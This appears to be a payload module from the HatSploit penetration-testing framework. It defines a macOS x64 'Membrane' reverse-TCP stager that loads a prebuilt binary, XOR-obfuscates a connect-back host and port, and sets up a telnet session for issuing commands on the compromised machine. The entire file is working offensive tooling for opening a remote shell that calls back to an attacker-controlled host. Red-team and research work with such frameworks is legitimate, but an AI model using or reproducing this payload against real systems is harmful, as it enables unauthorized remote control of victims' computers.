#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from hatsploit.lib.config import Config
from hatsploit.utils.string import StringTools
from hatsploit.utils.tcp import TCPClient

from hatsploit.lib.session import Session
from hatsploit.utils.telnet import TelnetClient


class HatSploitSession(Session, TelnetClient):
    client = None

    details = {
        'Platform': "macos",
        'Type': "membrane"
    }

    def open(self, client):
        self.client = self.open_telnet(client)

    def close(self):
        self.client.disconnect()

    def send_command(self, command, output=False, timeout=10):
        output = self.client.send_command(command + '\n', output, timeout)
        if output:
            output = output.replace('membrane > ', '')
        return output

    def interact(self):
        self.client.interact()


class HatSploitPayload(Payload, StringTools):
    config = Config()

    details = {
        'Category': "stager",
        'Name': "macOS x64 Membrane Reverse TCP",
        'Payload': "macos/x64/membrane_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Membrane reverse TCP payload for macOS x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "macos",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'CBHOST': {
            'Description': "Connect-back host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'CBPORT': {
            'Description': "Connect-back port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)

        connback_host = self.xor_string(connback_host)
        connback_port = self.xor_string(connback_port)

        with open(f"{self.config.path_config['data_path']}membrane/macos/x64/membrane", 'rb') as f:
            payload = f.read()

        return payload, f"reverse '{connback_host}' '{connback_port}'", HatSploitSession
